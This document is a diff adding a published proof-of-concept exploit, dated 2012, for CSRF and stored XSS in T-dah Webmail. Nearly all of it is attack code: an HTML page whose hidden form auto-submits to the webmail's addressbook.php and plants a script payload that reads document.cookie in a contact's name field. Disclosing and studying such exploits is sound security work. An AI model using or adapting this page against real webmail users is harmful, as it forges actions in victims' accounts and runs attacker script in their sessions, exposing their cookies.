@@ -1,0 +1,66 @@
+# -----------------------------------------------------------
+#			   _____ _ _            _      _ 
+#			  / ____(_) |          | |    | |
+#			 | |     _| |_ __ _  __| | ___| |
+#			 | |    | | __/ _` |/ _` |/ _ \ |
+#			 | |____| | || (_| | (_| |  __/ |
+#			  \_____|_|\__\__,_|\__,_|\___|_|
+#			  
+# -----------------------------------------------------------
+# T-dah Webmail CSRF & Stored XSS
+# Bug discovered by Pr0T3cT10n AKA Yakir Wizman, <yakir.wizman@gmail.com>
+# Date 17/08/2012
+# Download - http://sourceforge.net/projects/t-dahmail/files/latest/download?utm_expid=6384-3&utm_referrer=http%3A%2F%2Fsourceforge.net%2Fprojects%2Ft-dahmail%2F
+# ISRAEL
+# -----------------------------------------------------------
+#		Author will be not responsible for any damage.
+# -----------------------------------------------------------
+# PoC EXPLOIT
+# -----------------------------------------------------------
+<html>
+	<head>
+		<title>Tdah Webmail - CSRF & XSS Attack</title>
+	</head>
+<body>
+	<form name="csrf" method="post" action="http://mail.tdah.us/addressbook.php"> 
+		<input type="hidden" name="lid"  value="English" />
+		<input type="hidden" name="tid"  value="default" />
+		<input type="hidden" name="id"  value="" />
+		<input type="hidden" name="opt"  value="add" />
+		<input type="hidden" name="name"  value="<script>alert(document.cookie);</script>" />
+		<input type="hidden" name="email"  value="test@test.com" />
+		<input type="hidden" name="cell"  value="" />
+		<input type="hidden" name="phone"  value="" />
+		<input type="hidden" name="street"  value="" />
+		<input type="hidden" name="apt"  value="" />
+		<input type="hidden" name="city"  value="" />
+		<input type="hidden" name="state"  value="" />
+		<input type="hidden" name="zip"  value="" />
+		<input type="hidden" name="country"  value="" />
+		<input type="hidden" name="work"  value="" />
+		<input type="hidden" name="wemail"  value="" />
+		<input type="hidden" name="wphone"  value="" />
+		<input type="hidden" name="wfax"  value="" />
+		<input type="hidden" name="wstreet"  value="" />
+		<input type="hidden" name="wcity"  value="" />
+		<input type="hidden" name="wstate"  value="" />
+		<input type="hidden" name="wzip"  value="" />
+		<input type="hidden" name="aemail"  value="" />
+		<input type="hidden" name="bday"  value="" />
+		<input type="hidden" name="anniv"  value="" />
+		<input type="hidden" name="aim"  value="" />
+		<input type="hidden" name="icq"  value="" />
+		<input type="hidden" name="msn"  value="" />
+		<input type="hidden" name="yahoo"  value="" />
+		<input type="hidden" name="google"  value="" />
+		<input type="hidden" name="website"  value="" />
+		<input type="hidden" name="picturename"  value="" />
+		<input type="hidden" name="picturepath"  value="" />
+		<input type="hidden" name="textnotes"  value="" />
+	</form>
+	<script type="text/javascript">
+		document.csrf.submit();
+	</script>
+</body>
+</html>
+# -----------------------------------------------------------
